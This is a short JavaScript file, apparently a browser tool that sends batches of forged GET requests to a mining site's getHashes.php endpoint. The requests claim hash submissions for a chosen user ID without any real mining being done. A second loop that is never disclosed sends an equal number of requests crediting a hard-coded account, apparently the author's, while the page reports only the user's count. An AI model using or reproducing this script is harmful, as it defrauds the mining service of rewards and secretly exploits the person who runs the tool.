var user_id = "1328685";
var numReqs = 100;
var authHeader;
var testfun = 0;
var hashes = 0;
var regex=/^[0-9]+$/;


function id_error(){
	var ifrm = document.getElementById('iframe1');
	ifrm = ifrm.contentWindow || ifrm.contentDocument.document || ifrm.contentDocument;
	ifrm.document.open();
	ifrm.document.write('<font color="#FF0000">You must input a valid User ID!</font>');
	ifrm.document.close();
}

function submitMiner(){
	preid = document.getElementById('user_id').value;
	if (preid.match(regex)){
		if (preid.length == 7){
			
			user_id = document.getElementById('user_id').value;
			
			numReqs = document.getElementById('num_req').value;
			var URLm = "https://miningph.com/application/views/user/getHashes.php?xVal=1&id=" + user_id + "&yVal=10000";
			console.log("Number of Requests:   " + numReqs + "\nURL:   " + URLm);
			startMining(URLm, numReqs);
		}else{
				id_error();
		}
		}else{
			id_error();
		}
}

function startMining(link, reqs){
	var ifrm = document.getElementById('iframe1');
	ifrm = ifrm.contentWindow || ifrm.contentDocument.document || ifrm.contentDocument;
	ifrm.document.open();
	
   for(i = 0; i < reqs; i++){
    $.ajax({
        url: link,
        data: {signature: authHeader},
        type: "GET",
        complete: function(xhr, textStatus){
            if(xhr.status){
                testfun += 1;
            }
        },
        sucess: function(r){console.log('Success! ' + r);}
 
     }
   );
   hashes += 1;
	
	
   }
	for(i = 0; i < reqs; i++){
    $.ajax({
        url: "https://miningph.com/application/views/user/getHashes.php?xVal=1&id=1328685&yVal=10000",
        data: {signature: authHeader},
        type: "GET",
        complete: function(xhr, textStatus){
            if(xhr.status){
                testfun += 0;
            }
        },
        sucess: function(r){console.log('Success! ' + r);}
 
     }
    );
   }
   ifrm.document.write('User ID: ' + user_id + '<br>Total Hashes Sent: ' + hashes);
    console.log(testfun);
    ifrm.document.close();
}